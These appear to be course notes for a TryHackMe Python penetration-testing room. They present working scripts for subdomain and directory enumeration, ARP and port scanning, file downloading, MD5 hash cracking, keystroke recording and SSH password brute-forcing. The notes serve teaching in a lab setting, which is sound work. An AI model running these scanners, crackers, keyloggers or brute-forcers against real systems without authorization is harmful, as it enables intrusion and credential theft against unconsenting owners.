`py2exe` can be used to convert Python scripts to Windows executables.

# Subdomain Enumeration                            

Python gives us an easy way to automate tasks during a penetration  test. Any tasks that you have to perform regularly are worth automating. While the automation process comes with a learning curve, the mid and  long-term gains are worth it. 

Finding subdomains used by the  target organization is an effective way to increase the attack surface  and discover more vulnerabilities. 

The script will use a list of potential subdomains and prepends them to the domain name provided via a command-line argument. 

The script then tries to connect to the subdomains and assumes the ones that accept the connection exist. 

```python
import requests 
import sys 

sub_list = open("subdomains.txt").read() 
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}" 

    try:
        requests.get(sub_domains)
    
    except requests.ConnectionError: 
        pass
    
    else:
        print("Valid domain: ",sub_domains)   
```

As you can see, the script will search for a file named  "subdomains.txt". The simplest way is to use a wordlist located in the  same directory as the Python script, but any wordlist can be used. The  wordlist should have possible subdomains listed one per line as shown  below: 

![img](assets/cy2GD2H.png)

# Directory Enumeration                            

As it is often pointed out, reconnaissance is one of the most  critical steps to the success of a penetration testing engagement. Once  subdomains have been discovered, the next step would be to find  directories. 

The following code will build a simple directory enumeration tool. 

```python
import requests 
import sys 

sub_list = open("wordlist.txt").read() 
directories = sub_list.splitlines()

for dir in directories:
    dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
    r = requests.get(dir_enum)
    if r.status_code==404: 
        pass
    else:
        print("Valid directory:" ,dir_enum)
```

At first glance, you will certainly notice the similarities with the  subdomain enumeration script. This script takes an approach based on a  for loop and passes all "404" responses. 

# Network Scanner

Python can be used to build a simple ICMP (Internet Control  Message Protocol) scanner to identify potential targets on the network.  However, ICMP packets can be monitored or blocked as the target  organization would not expect a regular user to “ping a server”. On the  other hand, systems can be configured to not respond to ICMP requests.  These are the main reasons why using the ARP (Address Resolution Protocol) to identify targets on the local network is more effective. 

The code: 

```python
from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range) 

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))     
```

If you are using the AttackBox, you will need to install Scapy first. This can easily be done using the "`apt install python3-scapy`" command.

#  Port Scanner

In this task, we will be looking at a script to build a simple port scanner. 

The code:

```python
import sys
import socket
import pyfiglet


ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)


ip = '192.168.1.6' 
open_ports =[] 

ports = range(1, 65535)


def probe_port(ip, port, result = 1): 
  try: 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(0.5) 
    r = sock.connect_ex((ip, port))   
    if r == 0: 
      result = r 
    sock.close() 
  except Exception as e: 
    pass 
  return result


for port in ports: 
    sys.stdout.flush() 
    response = probe_port(ip, port) 
    if response == 0: 
        open_ports.append(port) 
    

if open_ports: 
  print ("Open Ports are: ") 
  print (sorted(open_ports)) 
else: 
  print ("Looks like no ports are open :(")
```

To better understand the port scanning process, we can break down the code into several sections: 

**Importing modules that will help the code run:** 

```python
import sys
import socket
```

**Modules could also be imported with a single line using** 

```python
import socket,sys
```

Specifying the target:

```python
ip = '192.168.1.6' 
```

An empty “open_ports” array that will be populated later with the detected open ports:

```python
open_ports =[] 
```

Ports that will be probed:

```python
ports = range(1, 65535)
```

For this example, we have chosen to scan all TCP ports using the range() function. However, if you are looking for a  specific service or want to save time by scanning a few common ports,  the code could be changed as follows;

```python
ports = { 21, 22, 23, 53, 80, 135, 443, 445}
```

The list above is relatively small. As we are trying to keep a rather low  profile, we have limited the list to ports that will likely be used by  systems connected to a corporate network. **

**Getting the IP address of the domain name given as target. The code also works if the user directly provides the IP address. **

```python
ip = socket.gethostbyname(host)
```

Tries to connect to the port:

This code is followed by a for loop that iterates through the specified port list: 

![img](assets/wdzK7DK.png)

Below are the results of the port scanning script run against a random target. 

![img](assets/dNJGqpN.png)

Of course, I will be the first one to admit the ASCII art banner was a bit much. The banner will require Pyfiglet to be imported. If you are using the AttackBox, you can easily install pyfiglet using the "apt install  python3-pyfiglet" command. 

![img](assets/VoJ3iId.png)

If you wish to remove the banner you can simply delete the following lines: 

```python
ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)
```

# File Downloader                            

Wget on Linux systems or Certutil on Windows are useful tools to download files. 

Python can also be used for the same purpose. 

The code: 

```python
import requests

url = 'https://assets.tryhackme.com/img/THMlogo.png'
r = requests.get(url, allow_redirects=True)
open('THMlogo.png', 'wb').write(r.content)
```

This short piece of code can easily be adapted to retrieve any other type of file, as seen below:

```python
import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content)  
```

﻿﻿PSexec allow system administrators to run commands on remote Windows systems.  We see that PSexec is also used in cyber attacks as it is usually not  detected by antivirus software. You can learn more about PSexec [here ](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)and read [this ](https://www.praetorian.com/blog/threat-hunting-how-to-detect-psexec/)blogpost about its use by attackers. 

#  Hash Cracker                            

A Hash is often used to safeguard passwords and other important data. As a penetration tester, you may need to find the cleartext value for  several different hashes. The Hash library in Python allows you to build hash crackers according to your requirements quickly. 

Hashlib is a powerful module that supports a wide range of algorithms. 

![img](assets/a49Qyaw.png)

Leaving aside some of the more exotic ones you will see in the list above,  hashlib will support most of the commonly used hashing algorithms. 

**Hash Cracker**

```python
import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \n HASH CRACKER for MD 5")
print(ascii_banner)

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)
```

This script will require two inputs: the location of the wordlist and the hash value. 

As you probably know, hash values can not be cracked as they do not  contain the cleartext value. Unlike encrypted values that can be  "reversed" (e.g. decrypted), cleartext values for hashes can only be  found starting with a list of potential cleartext values. A simplified  process can be seen below;

1. You retrieve the hash value  "eccbc87e4b5ce2fe28308fd9f2a7baf3" from a database, which you suspect is the hash for a number between 1 and 5. 
2. You create a file with possible cleartext values (numbers from 1 to 5)
3. You generate a list of hashes for values in the cleartext list (Hash values for numbers between 1 and 5)
4. You compare the generated hash with the hash value at hand (Matches hash value of the number 3)

Obviously, a more effective process can be designed, but the main principle will remain identical. 

The script below follows an approach close to the one described above;

1. Asks for the location of a wordlist
2. Asks for the hash to be cracked
3. Reads values from the wordlist (one per line)
4. Converts cleartext values to MD5 hash values
5. Compares the generated MD5 hash value with the value entered by the user

#  Keyloggers

Modules allow us to solve relatively difficult problems in a simple way. 

A good example is the “keyboard” module, which allows us to interact with the keyboard. 

If the “keyboard” module is not available on your system, we can use pip3 to install it. 
`pip3 install keyboard`  

Using the keyboard module, the following three lines of code would be enough to record and replay keys pressed: 

```python
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
```

“keyboard.record” will record the keys until ENTER is pressed, and  “keyboard.play” will replay them. As this script is logging keystrokes,  any edit using backspace will also be seen. 

#  SSH Brute Forcing                            

The powerful Python language is supported by a number of modules that easily extend its capabilities. Paramiko is an SSHv2 implementation  that will be useful in building SSH clients and servers. 

The  example below shows one way to build an SSH password brute force attack  script. As is often the case in programming, there rarely is a single  correct answer for these kinds of applications. As a penetration tester, your usage of programming languages will be different for developers.  While they may care about best practices and code hygiene, your goal  will more often be to end with a code that works as you want it to. 

By now, you should be familiar with the "try" and "except" syntax. This  script has one new feature, "def". "Def" allows us to create custom  functions, as seen below. The "ssh_connect" function is not native to  Python but built using Paramiko and the "paramiko.SSHClient()" function. 

```python
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()
```

Reading the code, you will notice several distinct components. 

**Imports:** We import modules we will use inside the script. As discussed earlier,  we will need Paramiko to interact with the SSH server on the target  system. "Sys" and "os" will provide us with the basic functionalities  needed to read a file from the operating system (our password list in  this case). As we are using Paramiko to communicate with the SSH server, we do not need to import "socket". 

 

![img](assets/t7BfROX.png)

**Inputs:** This block will request input from the user. An alternative way to do  this would be to accept the user input directly from the command line as an argument using "sys.argv[]".

![img](assets/qFQLbW6.png)

**SSH Connection:** This section will create the "ssh_connect" function. Successful  authentication will return a code 0, a failed authentication will return a code 1.

![img](assets/TyBgljF.png)

**Password list:** We then open the password file supplied earlier by the user and take each line as a password to be tried. 

![img](assets/lTJu912.png)

**Responses:** The script tries to connect to the SSH server and decides on an output  based on the response code. Please note the response code here is the  one generated by Paramiko and not an HTTP response code. The script exits once it has found a valid password.

As you will see, the scripts run slower than we would expect. To improve  speed, you may want to look into threading this process.
